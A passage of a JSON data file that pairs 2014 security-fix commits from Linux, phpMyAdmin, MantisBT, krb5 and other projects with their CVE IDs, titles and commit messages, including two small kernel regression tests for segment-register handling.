    "body": "We did not implement any bound on number of indirect ICBs we follow whenloading inode. Thus corrupted medium could cause kernel to go into aninfinite loop, possibly causing a stack overflow.Fix the possible stack overflow by removing recursion from__udf_read_inode() and limit number of indirect ICBs we follow to avoidinfinite loops.Signed-off-by: Jan Kara <jack@suse.cz>",
    "cveIds": [
      "CVE-2014-6410"
    ],
    "cveIdsCount": 1
  },
  "40517bcc651b6e419cc927a7a94ca4381f8c1e4ecec22a3c34f99cd03758c468": {
    "url": "https://github.com/torvalds/linux/commit/c27a3e4d667fdcad3db7b104f75659478e0c68d8",
    "title": "libceph: do not hard code max auth ticket len",
    "body": "We hard code cephx auth ticket buffer size to 256 bytes. This isn'tenough for any moderate setups and, in case tickets themselves are notencrypted, leads to buffer overflows (ceph_x_decrypt() errors out, butceph_decode_copy() doesn't - it's just a memcpy() wrapper). Since thebuffer is allocated dynamically anyway, allocated it a bit later, atthe point where we know how much is going to be needed.Fixes: http://tracker.ceph.com/issues/8979Cc: stable@vger.kernel.orgSigned-off-by: Ilya Dryomov <ilya.dryomov@inktank.com>Reviewed-by: Sage Weil <sage@redhat.com>",
    "cveIds": [
      "CVE-2014-6416",
      "CVE-2014-6417",
      "CVE-2014-6418"
    ],
    "cveIdsCount": 3
  },
  "7c7ed349fc06293dc6bd5e99116a4960bf0561506ff22f95a3adefefb75910ee": {
    "url": "https://github.com/torvalds/linux/commit/18f39e7be0121317550d03e267e3ebd4dbfbb3ce",
    "title": "[CIFS] Possible null ptr deref in SMB2_tcon",
    "body": "As Raphael Geissert pointed out, tcon_error_exit can dereference tconand there is one path in which tcon can be null.Signed-off-by: Steve French <smfrench@gmail.com>CC: Stable <stable@vger.kernel.org> # v3.7+Reported-by: Raphael Geissert <geissert@debian.org>",
    "cveIds": [
      "CVE-2014-7145"
    ],
    "cveIdsCount": 1
  },
  "17861ad3ca4a5eb6ff7e99cb3dac9783e455bb1064bd50fe5b17b863a5efb267": {
    "url": "https://github.com/mantisbt/mantisbt/commit/bed19db9",
    "title": "XML Import: Fix php code injection vulnerability",
    "body": "Egidio Romano discovered a vulnerability in the XML import plugin.User input passed through the \"description\" field (and the \"issuelink\"attribute) of the uploaded XML file isn't properly sanitized beforebeing used in a call to the preg_replace() function which uses the 'e'modifier. This can be exploited to inject and execute arbitrary PHP codewhen the Import/Export plugin is installed.This fix is a partial backport from a master branch commit which hasbeen confirmed as addressing the issue (8401753)excluding changes not relevant to fixing the security issue, includingsubsequent fixes (aea1a34,4350b4d).Fixes #17725 (CVE-2014-7146)",
    "cveIds": [
      "CVE-2014-7146"
    ],
    "cveIdsCount": 1
  },
  "f4bd0db6124faebcca203869a5d5e48847dc26d93296556699ea097c53781a20": {
    "url": "https://github.com/mantisbt/mantisbt/commit/84017535",
    "title": "Issue #12013: Improved ImportExportXml plugin",
    "body": "Improvements made to the importing and exporting features of thisplugin:* Added support for custom fields, bugnotes and attachments* Added support for dates (date submitted, last updated) - keep dates asgiven in import file* Added function to easily retrieve the contents of a file(file_api.php)Signed-off-by: David Hicks <hickseydr@optusnet.com.au>",
    "cveIds": [
      "CVE-2014-7146"
    ],
    "cveIdsCount": 1
  },
  "1d0023e59ccb85857345c3870bba86550bf6b7ad761d1b6490bb334b617ebc19": {
    "url": "https://github.com/substack/node-syntax-error/commit/9aa4e66eb90ec595d2dba55e6f9c2dd9a668b309",
    "title": "use eval() with early throw instead of Function() to prevent script i…",
    "body": "…njection",
    "cveIds": [
      "CVE-2014-7192"
    ],
    "cveIdsCount": 1
  },
  "46b6f698ed28556ad37b1072e40956a62d0858c22b80cbf26940d444b763f1b9": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/c1a3f85fbd1a9569646e7cf1b791325ae82c7961",
    "title": "[security] XSS with malicious ENUM values",
    "body": "Signed-off-by: Marc Delisle <marc@infomarc.info>Conflicts:libraries/Util.class.php",
    "cveIds": [
      "CVE-2014-7217"
    ],
    "cveIdsCount": 1
  },
  "749fefc18c1ffc90f20e7db421d68f8c42be6f9c46249abb03d699c63210291e": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/304fb2b645b36a39e03b954fdbd567173ebe6448",
    "title": "Bug 4544: additional fix for 4.2.x",
    "body": "Signed-off-by: Marc Delisle <marc@infomarc.info>",
    "cveIds": [
      "CVE-2014-7217"
    ],
    "cveIdsCount": 1
  },
  "433f1d1d644a5313e417f0acda601f2e528b11c07b740b5656d38d4a73e48157": {
    "url": "https://github.com/chyrp/chyrp/commit/43d1b6b266363ae7545d5d49851034eaeec7bebb",
    "title": "Fixed a potential XSS vulnerability.",
    "body": "Thanks JPCERT for reporting it to us.",
    "cveIds": [
      "CVE-2014-7264"
    ],
    "cveIdsCount": 1
  },
  "a4b122ae6a7721176a8aee00ac858caee88875f95c4c98ab7aeac38866f2fd72": {
    "url": "https://github.com/torvalds/linux/commit/c88547a8119e3b581318ab65e9b72f27f23e641d",
    "title": "xfs: fix directory hash ordering bug",
    "body": "Commit f5ea110 (\"xfs: add CRCs to dir2/da node blocks\") introducedin 3.10 incorrectly converted the btree hash index array pointer inxfs_da3_fixhashpath(). It resulted in the the current hash alwaysbeing compared against the first entry in the btree rather than thecurrent block index into the btree block's hash entry array. As aresult, it was comparing the wrong hashes, and so could misorder theentries in the btree.For most cases, this doesn't cause any problems as it requires hashcollisions to expose the ordering problem. However, when there arehash collisions within a directory there is a very good probabilitythat the entries will be ordered incorrectly and that actuallymatters when duplicate hashes are placed into or removed from thebtree block hash entry array.This bug results in an on-disk directory corruption and that resultsin directory verifier functions throwing corruption warnings intothe logs. While no data or directory entries are lost, access tothem may be compromised, and attempts to remove entries from adirectory that has suffered from this corruption may result in afilesystem shutdown. xfs_repair will fix the directory hashordering without data loss occuring.[dchinner: wrote useful a commit message]cc: <stable@vger.kernel.org>Reported-by: Hannes Frederic Sowa <hannes@stressinduktion.org>Signed-off-by: Mark Tinguely <tinguely@sgi.com>Reviewed-by: Ben Myers <bpm@sgi.com>Signed-off-by: Dave Chinner <david@fromorbit.com>",
    "cveIds": [
      "CVE-2014-7283"
    ],
    "cveIdsCount": 1
  },
  "f5803d8835a9c7cc2a0820c664fadc69565b26829405a92a41c0096011db0cc6": {
    "url": "https://github.com/torvalds/linux/commit/3d4405226d27b3a215e4d03cfa51f536244e5de7",
    "title": "net: avoid dependency of net_get_random_once on nop patching",
    "body": "net_get_random_once depends on the static keys infrastructure to patch upthe branch to the slow path during boot. This was realized by abusing thestatic keys api and defining a new initializer to not enable the callsite while still indicating that the branch point should get patchedup. This was needed to have the fast path considered likely by gcc.The static key initialization during boot up normally walks through allthe registered keys and either patches in ideal nops or enables the jumpsite but omitted that step on x86 if ideal nops where already placed atstatic_key branch points. Thus net_get_random_once branches not alwaysbecame active.This patch switches net_get_random_once to the ordinary static_keyapi and thus places the kernel fast path in the - by gcc considered -unlikely path. Microbenchmarks on Intel and AMD x86-64 showed thatthe unlikely path actually beats the likely path in terms of cycle costand that different nop patterns did not make much difference, thus thisswitch should not be noticeable.Fixes: a48e429 (\"net: introduce new macro net_get_random_once\")Reported-by: Tuomas Räsänen <tuomasjjrasanen@tjjr.fi>Cc: Linus Torvalds <torvalds@linux-foundation.org>Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2014-7284"
    ],
    "cveIdsCount": 1
  },
  "d8d5af533d31da5491abbbbc5be4f4d961424edd6dadd548aa683dc5baf2eb71": {
    "url": "https://github.com/torvalds/linux/commit/338f977f4eb441e69bb9a46eaa0ac715c931a67f",
    "title": "mac80211: fix fragmentation code, particularly for encryption",
    "body": "The \"new\" fragmentation code (since my rewrite almost 5 years ago)erroneously sets skb->len rather than using skb_trim() to adjustthe length of the first fragment after copying out all the others.This leaves the skb tail pointer pointing to after where the dataoriginally ended, and thus causes the encryption MIC to be writtenat that point, rather than where it belongs: immediately after thedata.The impact of this is that if software encryption is done, then a) encryption doesn't work for the first fragment, the connection becomes unusable as the first fragment will never be properly verified at the receiver, the MIC is practically guaranteed to be wrong b) we leak up to 8 bytes of plaintext (!) of the packet out into the airThis is only mitigated by the fact that many devices are capableof doing encryption in hardware, in which case this can't happenas the tail pointer is irrelevant in that case. Additionally,fragmentation is not used very frequently and would normally haveto be configured manually.Fix this by using skb_trim() properly.Cc: stable@vger.kernel.orgFixes: 2de8e0d (\"mac80211: rewrite fragmentation\")Reported-by: Jouni Malinen <j@w1.fi>Signed-off-by: Johannes Berg <johannes.berg@intel.com>",
    "cveIds": [
      "CVE-2014-8709"
    ],
    "cveIdsCount": 1
  },
  "4c2ec0307d5d63ecda905cbb8eaf1e35aa14514c95883b0f510af5f1e750357c": {
    "url": "https://github.com/processone/ejabberd/commit/7bdc1151b",
    "title": "Make sure \"starttls_required\" can't be bypassed",
    "body": "Don't allow clients to circumvent the \"starttls_required\" option byenabling XMPP stream compression.",
    "cveIds": [
      "CVE-2014-8760"
    ],
    "cveIdsCount": 1
  },
  "04a9b83bf323bf62cf1b6e1560340c27e266113d36162d0809ab5fb0c6ac103b": {
    "url": "https://github.com/revive-adserver/revive-adserver/commit/2be73f9",
    "title": "Fixed CVE-2014-8793",
    "body": "Also includes a better fix for 12f9465",
    "cveIds": [
      "CVE-2014-8793"
    ],
    "cveIdsCount": 1
  },
  "2d560576347b429b8d6feb20975e5de0da81d0250b1bc6ebf0351ab30d2890f9": {
    "url": "https://github.com/torvalds/linux/commit/f2e323ec96077642d397bb1c355def536d489d16",
    "title": "[media] ttusb-dec: buffer overflow in ioctl",
    "body": "We need to add a limit check here so we don't overflow the buffer.Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>Signed-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>",
    "cveIds": [
      "CVE-2014-8884"
    ],
    "cveIdsCount": 1
  },
  "f57bbc40fa92aec24dd318ed296928306cf35c2c21db9f95d2ac5bb300f040cd": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/2ffdbf2d7daa0b92541d8b754e2afac555d3ed21",
    "title": "bug #4597 [security] XSS through pma_fontsize cookie",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2014-8958"
    ],
    "cveIdsCount": 1
  },
  "46c13038ba0e6749b443b9153060e89900aa8d0eefbde57a9499631be7a25d8d": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/2a3b7393d1d5a8ba0543699df94a08a0f5728fe0",
    "title": "bug #4598 [security] XSS in multi submit",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2014-8958"
    ],
    "cveIdsCount": 1
  },
  "233b559085b5e5d12b1f9d8784fd997ddfc23f15cc7181fccdfb90c6fd931e8e": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/1bc04ec95038f2356ad33752090001bf1c047208",
    "title": "bug #4579 [security] XSS vulnerability in zoom search page",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2014-8958"
    ],
    "cveIdsCount": 1
  },
  "cee0e3629b0ae344368f947d45f9be1af07b500009c1b3a56d726b9fe7734003": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/d32da348c4de2379482a48661ce968a55eebe5c4",
    "title": "bug #4578 [security] XSS vulnerability in table print view",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2014-8958"
    ],
    "cveIdsCount": 1
  },
  "39b16cf1bc41314e001f2279382c3be27bfb39d3aa2d4f5ea68f1ee5c375fe1d": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/80cd40b6687a6717860d345d6eb55bef2908e961",
    "title": "bug #4594 [security] Path traversal in file inclusion of GIS factory",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2014-8959"
    ],
    "cveIdsCount": 1
  },
  "90be85102a64c58dac0cd0b63230c582cd29b707f9823caa7fca6db7f48458f5": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/9364e2eee5681681caf7205c0933bc18af11e233",
    "title": "bug #4596 [security] XSS through exception stack",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2014-8960"
    ],
    "cveIdsCount": 1
  },
  "168c9a80fc4db3c61d7528ad5ffa363944222b3e36cce0b7976103cb76d9928e": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/b99b6b6672ff2419f05b05740c80c7a23c1da994",
    "title": "bug #4595 [security] Path traversal can lead to leakage of line count",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2014-8961"
    ],
    "cveIdsCount": 1
  },
  "88b5ab06e1ea8dc459e0235f14eecb1f48f9d364ce9d07cd572ddecf7f2b255e": {
    "url": "https://github.com/mantisbt/mantisbt/commit/cabacdc291c251bfde0dc2a2c945c02cef41bf40",
    "title": "Fix: adm_config_report.php filtering does not check config option is …",
    "body": "…validI've left this throwing ERROR_GENERIC as the only time this should be ableto be hit is if we have invalid input to start with.",
    "cveIds": [
      "CVE-2014-8986"
    ],
    "cveIdsCount": 1
  },
  "1aa00319ca749f320756c122b6ff6f4573edf16a7cc449a277ac37d2e58cefb0": {
    "url": "https://github.com/mantisbt/mantisbt/commit/49c3d089",
    "title": "Fix #17870: XSS in adm_config_report.php",
    "body": "This is the correct fix for this issue, using string_attribute() toescape the variable. Thanks to Paul Richards for pointing this out.",
    "cveIds": [
      "CVE-2014-8987"
    ],
    "cveIdsCount": 1
  },
  "5c0803d59f96a44cd6883fedcad2c0bd128e5543f3852cba5d42c59412e1174e": {
    "url": "https://github.com/mantisbt/mantisbt/commit/5f0b150b",
    "title": "Incorrect access check on attachment downloads",
    "body": "Even if config variables $g_download_attachments_threshold and$g_view_attachments_threshold are set to 55 (developer), users withlower privileges can download attachments.Fixes #17742Signed-off-by: Damien Regad <dregad@mantisbt.org>",
    "cveIds": [
      "CVE-2014-8988"
    ],
    "cveIdsCount": 1
  },
  "f3d9318e137a9c23f09004d705f80ce62155a95f57cd61ca86b037567e9722fa": {
    "url": "https://github.com/mantisbt/mantisbt/commit/b0021673ab23249244119bde3c7fcecd4daa4e7f",
    "title": "Improve validation for filter sort and direction",
    "body": "Fixes #17841",
    "cveIds": [
      "CVE-2014-9089"
    ],
    "cveIdsCount": 1
  },
  "8f415b166009b3f9a00232faa9ed4f31ce6818abe909bfe632d21ebe349cd0c2": {
    "url": "https://github.com/Pligg/pligg-cms/commit/4891c4d8742b9dabd67e7250840e3434865aebed",
    "title": "- Added another layer of sanitization to the recover password page, a…",
    "body": "…s recommended by Dominik",
    "cveIds": [
      "CVE-2014-9096"
    ],
    "cveIdsCount": 1
  },
  "0e0ede1da19d8dd13dbd756bb48931a6c2325cfdd3b12127ff5868864768afbc": {
    "url": "https://github.com/the-tcpdump-group/tcpdump/commit/0f95d441e4b5d7512cc5c326c8668a120e048eda",
    "title": "Do bounds checking when unescaping PPP.",
    "body": "Clean up a const issue while we're at it.",
    "cveIds": [
      "CVE-2014-9140"
    ],
    "cveIdsCount": 1
  },
  "b478f4870565ade41f394f562632300efb9d2df81f2c1de80e1951cab4dbc420": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/62b2c918d26cc78d1763945e3d44d1a63294a819",
    "title": "bug #4611 [security] DOS attack with long passwords",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2014-9218"
    ],
    "cveIdsCount": 1
  },
  "6873c55fe5efeed6a658fa004c5eb66fdcbac0da46e07e44eed6541c56321f1a": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/1ac863c7573d12012374d5d41e5c7dc5505ea6e1",
    "title": "bug #4611 [security] DOS attack with long passwords",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2014-9218"
    ],
    "cveIdsCount": 1
  },
  "f8c2733182eef55d815d2ac8b4bf7b90ad14fe3be6505d30c3489334fee1ae98": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/095729d81205f15f40d216d25917017da4c2fff8",
    "title": "bug #4611 [security] DOS attack with long passwords",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2014-9218"
    ],
    "cveIdsCount": 1
  },
  "27dde5fbdb06f7f894321f46a3b41ef97e6b6bb082a7bd2bb7c657c9a7c3a516": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/9b2479b7216dd91a6cc2f231c0fd6b85d457f6e2",
    "title": "bug #4612 [security] XSS vulnerability in redirection mechanism",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2014-9219"
    ],
    "cveIdsCount": 1
  },
  "5ecc7fd190104994ab3a9fa008ce977e57751b77f1ce833ddc1e4c9ed3d1bd7c": {
    "url": "https://github.com/splitbrain/dokuwiki/commit/778ddf6f2cd9ed38b9db2d73e823b8c21243a960",
    "title": "disable flash uploading by default",
    "body": "Thanks to Kacper Szurek for reporting this",
    "cveIds": [
      "CVE-2014-9253"
    ],
    "cveIdsCount": 1
  },
  "da33972d8bd4c479775140ec3b9b15082d9fb8b7e1dfdedca4320fc642beb361": {
    "url": "https://github.com/mantisbt/mantisbt/commit/511564cc",
    "title": "Fix #17890: XSS in extended project browser",
    "body": "Extended project browser allows projects to be passed in as A;B.helper_get_current_project() and helper_get_current_project_trace() thenexplodes the string by ';' and don't check that A is an int (a project /sub-project id). Finally, print_extended_project_browser() prints theresult of the split into a javascript array.Paul Richards discovered the issue and wrote the original patch for it.His code was modified to remove a redudant typecast as well as anunnecessary foreach loop in helper_get_current_project(), replacing itwith a single type cast.",
    "cveIds": [
      "CVE-2014-9269"
    ],
    "cveIdsCount": 1
  },
  "996e7e89499d53ed67b5ef2e6077d405358e386bff888f7663b210f0a7625ab8": {
    "url": "https://github.com/mantisbt/mantisbt/commit/0bff06ec",
    "title": "Fix #17583: XSS in projax_api.php",
    "body": "Offensive Security reported this issue via their bug bounty program [1].The Projax library does not properly escape html strings. An attackercould take advantage of this to perform an XSS attack using theprofile/Platform field.[1] http://www.offensive-security.com/bug-bounty-program/Signed-off-by: Damien Regad <dregad@mantisbt.org>",
    "cveIds": [
      "CVE-2014-9270"
    ],
    "cveIdsCount": 1
  },
  "aff5ffd62ede47652610dbff20565586e63c57e431785a5a1537d14c1f39e795": {
    "url": "https://github.com/mantisbt/mantisbt/commit/9fb8cf36f",
    "title": "Fix #17874: XSS in file uploads",
    "body": "An attacker can upload a Flash file with an image extension. If such anattachment is displayed inline, it becomes a vector for XSS attacks.This issue was reported by Matthias Karlsson (http://mathiaskarlsson.me)as part of Offensive Security's bug bounty program [1].Patch with contribution from Victor Boctor.",
    "cveIds": [
      "CVE-2014-9271"
    ],
    "cveIdsCount": 1
  },
  "34bed770e627537b6df2825954ab3bd1ec3d75b07a8886c9b4d9c89d1020e1ee": {
    "url": "https://github.com/mantisbt/mantisbt/commit/05378e00",
    "title": "Fix #17297: XSS in string_insert_hrefs",
    "body": "The URL matching regex in the function did not validate the protocol,allowing an attacker to use 'javascript://' to execute arbitrary code.Issue was discovered by Mathias Karlsson (http://mathiaskarlsson.me)and reported by Offensive Security (http://www.offensive-security.com/).",
    "cveIds": [
      "CVE-2014-9272"
    ],
    "cveIdsCount": 1
  },
  "a11bf9b4d68d2f811e5569a62b27bb3856f3ab5e8d4037cc075b1b139b4bbd71": {
    "url": "https://github.com/libguestfs/hivex/commit/4bbdf555f88baeae0fa804a369a81a83908bd705",
    "title": "handle: Check that pages do not extend beyond the end of the file.",
    "body": "Thanks: Mahmoud Al-Qudsi",
    "cveIds": [
      "CVE-2014-9273"
    ],
    "cveIdsCount": 1
  },
  "64c308420001ec55ba3dc310dcc6205302217c3bb1596e9770a94844b4527386": {
    "url": "https://github.com/libguestfs/hivex/commit/357f26fa64fd1d9ccac2331fe174a8ee9c607adb",
    "title": "handle: Refuse to open files < 8192 bytes in size.",
    "body": "These cannot be valid hives, since they don't contain a full headerpage and at least a single page of data (in other words they couldn'tcontain a root node).Thanks: Mahmoud Al-Qudsi",
    "cveIds": [
      "CVE-2014-9273"
    ],
    "cveIdsCount": 1
  },
  "6475b6aaa3a7989e6b671ec88098c0bd42526fc174fe39d4679567799a07af13": {
    "url": "https://github.com/mantisbt/mantisbt/commit/0826cef8",
    "title": "DB Credentials leak in upgrade_unattended.php",
    "body": "Retrieve credentials from Mantis system configuration instead ofaccepting them from POST parameters.This issue was reported by Matthias Karlsson (http://mathiaskarlsson.me)as part of Offensive Security's bug bounty program [1].Paul Richards' original patch was modified to align the code with masterbranch to (basically replacing DIRECTORY_SEPARATOR by '/') to facilitateporting.Fixes #17877[1] http://www.offensive-security.com/bug-bounty-program/Signed-off-by: Damien Regad <dregad@mantisbt.org>",
    "cveIds": [
      "CVE-2014-9279"
    ],
    "cveIdsCount": 1
  },
  "5ef736cc58b28905a933e29372be1eb143dac31116de04e2de2370810be1afd9": {
    "url": "https://github.com/mantisbt/mantisbt/commit/599364b2",
    "title": "Do not pass raw user data to unserialize",
    "body": "Filters were moved to TOKEN api, so the code in current_user_api to handle?filter= on URL query strings is a left over from this move and is nolonger necessary.This issue was reported by Matthias Karlsson (http://mathiaskarlsson.me)as part of Offensive Security's bug bounty program [1].Fixes #17875[1] http://www.offensive-security.com/bug-bounty-program/Signed-off-by: Damien Regad <dregad@mantisbt.org>",
    "cveIds": [
      "CVE-2014-9280"
    ],
    "cveIdsCount": 1
  },
  "aeb8ec9d48afb99bdd8485ec8fd40e221064d11266830d084b6d52c2d258537b": {
    "url": "https://github.com/mantisbt/mantisbt/commit/e5fc835a",
    "title": "Fix #17876: XSS in copy_field.php",
    "body": "This issue was reported by Matthias Karlsson (http://mathiaskarlsson.me)as part of Offensive Security's bug bounty program [1].[1] http://www.offensive-security.com/bug-bounty-program/Signed-off-by: Damien Regad <dregad@mantisbt.org>",
    "cveIds": [
      "CVE-2014-9281"
    ],
    "cveIdsCount": 1
  },
  "b5d59c007c899cbf73f2895dd866375b858e429b6555f6c0f6fa892b590692c9": {
    "url": "https://github.com/torvalds/linux/commit/6f442be2fb22be02cafa606f1769fa1e6f894441",
    "title": "x86_64, traps: Stop using IST for #SS",
    "body": "On a 32-bit kernel, this has no effect, since there are no IST stacks.On a 64-bit kernel, #SS can only happen in user code, on a failed iretto user space, a canonical violation on access via RSP or RBP, or agenuine stack segment violation in 32-bit kernel code. The first twocases don't need IST, and the latter two cases are unlikely fatal bugs,and promoting them to double faults would be fine.This fixes a bug in which the espfix64 code mishandles a stack segmentviolation.This saves 4k of memory per CPU and a tiny bit of code.Signed-off-by: Andy Lutomirski <luto@amacapital.net>Reviewed-by: Thomas Gleixner <tglx@linutronix.de>Cc: stable@vger.kernel.orgSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2014-9322"
    ],
    "cveIdsCount": 1
  },
  "0f3929923a3cda059fdab34b74004ba42e06d917403746c387b286189018ce4e": {
    "url": "https://github.com/wp-plugins/w3-total-cache/commit/9a1cc9f70558282e135eb3120d271448c75b28dd#diff-86a10b31ab115483fe8111bedac14d15",
    "title": "Security update",
    "body": "git-svn-id: https://plugins.svn.wordpress.org/w3-total-cache/trunk@1041802 b8457f37-d9ea-0310-8a92-e5e31aec5664",
    "cveIds": [
      "CVE-2014-9414"
    ],
    "cveIdsCount": 1
  },
  "0ebb54c5906d6b9c3a7666af008be72b20cea4c777e0358dc02058c2d2b5b626": {
    "url": "https://github.com/torvalds/linux/commit/f647d7c155f069c1a068030255c300663516420e",
    "title": "x86_64, switch_to(): Load TLS descriptors before switching DS and ES",
    "body": "Otherwise, if buggy user code points DS or ES into the TLSarray, they would be corrupted after a context switch.This also significantly improves the comments and documents somegotchas in the code.Before this patch, the both tests below failed. With thispatch, the es test passes, although the gsbase test still fails. ----- begin es test -----/* * Copyright (c) 2014 Andy Lutomirski * GPL v2 */static unsigned short GDT3(int idx){return (idx << 3) | 3;}static int create_tls(int idx, unsigned int base){struct user_desc desc = {.entry_number = idx,.base_addr = base,.limit = 0xfffff,.seg_32bit = 1,.contents = 0, /* Data, grow-up */.read_exec_only = 0,.limit_in_pages = 1,.seg_not_present = 0,.useable = 0,};if (syscall(SYS_set_thread_area, &desc) != 0)err(1, \"set_thread_area\");return desc.entry_number;}int main(){int idx = create_tls(-1, 0);printf(\"Allocated GDT index %d\\n\", idx);unsigned short orig_es;asm volatile (\"mov %%es,%0\" : \"=rm\" (orig_es));int errors = 0;int total = 1000;for (int i = 0; i < total; i++) {asm volatile (\"mov %0,%%es\" : : \"rm\" (GDT3(idx)));usleep(100);unsigned short es;asm volatile (\"mov %%es,%0\" : \"=rm\" (es));asm volatile (\"mov %0,%%es\" : : \"rm\" (orig_es));if (es != GDT3(idx)) {if (errors == 0)printf(\"[FAIL]\\tES changed from 0x%hx to 0x%hx\\n\", GDT3(idx), es);errors++;}}if (errors) {printf(\"[FAIL]\\tES was corrupted %d/%d times\\n\", errors, total);return 1;} else {printf(\"[OK]\\tES was preserved\\n\");return 0;}} ----- end es test ----- ----- begin gsbase test -----/* * gsbase.c, a gsbase test * Copyright (c) 2014 Andy Lutomirski * GPL v2 */static unsigned char *testptr, *testptr2;static unsigned char read_gs_testvals(void){unsigned char ret;asm volatile (\"movb %%gs:%1, %0\" : \"=r\" (ret) : \"m\" (*testptr));return ret;}int main(){int errors = 0;testptr = mmap((void *)0x200000000UL, 1, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);if (testptr == MAP_FAILED)err(1, \"mmap\");testptr2 = mmap((void *)0x300000000UL, 1, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);if (testptr2 == MAP_FAILED)err(1, \"mmap\");*testptr = 0;*testptr2 = 1;if (syscall(SYS_arch_prctl, ARCH_SET_GS, (unsigned long)testptr2 - (unsigned long)testptr) != 0)err(1, \"ARCH_SET_GS\");usleep(100);if (read_gs_testvals() == 1) {printf(\"[OK]\\tARCH_SET_GS worked\\n\");} else {printf(\"[FAIL]\\tARCH_SET_GS failed\\n\");errors++;}asm volatile (\"mov %0,%%gs\" : : \"r\" (0));if (read_gs_testvals() == 0) {printf(\"[OK]\\tWriting 0 to gs worked\\n\");} else {printf(\"[FAIL]\\tWriting 0 to gs failed\\n\");errors++;}usleep(100);if (read_gs_testvals() == 0) {printf(\"[OK]\\tgsbase is still zero\\n\");} else {printf(\"[FAIL]\\tgsbase was corrupted\\n\");errors++;}return errors == 0 ? 0 : 1;} ----- end gsbase test -----Signed-off-by: Andy Lutomirski <luto@amacapital.net>Cc: <stable@vger.kernel.org>Cc: Andi Kleen <andi@firstfloor.org>Cc: Linus Torvalds <torvalds@linux-foundation.org>Link: http://lkml.kernel.org/r/509d27c9fec78217691c3dad91cec87e1006b34a.1418075657.git.luto@amacapital.netSigned-off-by: Ingo Molnar <mingo@kernel.org>",
    "cveIds": [
      "CVE-2014-9419"
    ],
    "cveIdsCount": 1
  },
  "19de7bb36cae84d006365cede9776349f622715ec9eaee6885a7de23970bc33f": {
    "url": "https://github.com/torvalds/linux/commit/f54e18f1b831c92f6512d2eedb224cd63d607d3d",
    "title": "isofs: Fix infinite looping over CE entries",
    "body": "Rock Ridge extensions define so called Continuation Entries (CE) whichdefine where is further space with Rock Ridge data. Corrupted isofsimage can contain arbitrarily long chain of these, including a onecontaining loop and thus causing kernel to end in an infinite loop whentraversing these entries.Limit the traversal to 32 entries which should be more than enough spaceto store all the Rock Ridge data.Reported-by: P J P <ppandit@redhat.com>CC: stable@vger.kernel.orgSigned-off-by: Jan Kara <jack@suse.cz>",
    "cveIds": [
      "CVE-2014-9420"
    ],
    "cveIdsCount": 1
  },
  "21bc2bbe764fc913f516960c81ecc457d61801b22bdac9d638ace4e0b72e3341": {
    "url": "https://github.com/krb5/krb5/commit/5bb8a6b9c9eb8dd22bc9526751610aaa255ead9c",
    "title": "Fix gssrpc data leakage [CVE-2014-9423]",
    "body": "[MITKRB5-SA-2015-001] In svcauth_gss_accept_sec_context(), do not copybytes from the union context into the handle field we send to theclient. We do not use this handle field, so just supply a fixedstring of \"xxxx\".In gss_union_ctx_id_struct, remove the unused \"interposer\" field whichwas causing part of the union context to remain uninitialized.ticket: 8058 (new)target_version: 1.13.1tags: pullup",
    "cveIds": [
      "CVE-2014-9423"
    ],
    "cveIdsCount": 1
  },
  "a5bf73db73b59a21f33f19a4d8345144b58bc4bb23138b57c0f57932df97fb6f": {
    "url": "https://github.com/torvalds/linux/commit/5b6698b0e4a37053de35cc24ee695b98a7eb712b",
    "title": "batman-adv: Calculate extra tail size based on queued fragments",
    "body": "The fragmentation code was replaced in 610bfc6(\"batman-adv: Receive fragmented packets and merge\"). The new code provided amostly unused parameter skb for the merging function. It is used inside thefunction to calculate the additionally needed skb tailroom. But instead ofincreasing its own tailroom, it is only increasing the tailroom of the firstqueued skb. This is not correct in some situations because the first queuedentry can be a different one than the parameter.An observed problem was:1. packet with size 104, total_size 1464, fragno 1 was received - packet is queued2. packet with size 1400, total_size 1464, fragno 0 was received - packet is queued at the end of the list3. enough data was received and can be given to the merge function (1464 == (1400 - 20) + (104 - 20)) - merge functions gets 1400 byte large packet as skb argument4. merge function gets first entry in queue (104 byte) - stored as skb_out5. merge function calculates the required extra tail as total_size - skb->len - pskb_expand_head tail of skb_out with 64 bytes6. merge function tries to squeeze the extra 1380 bytes from the second queued skb (1400 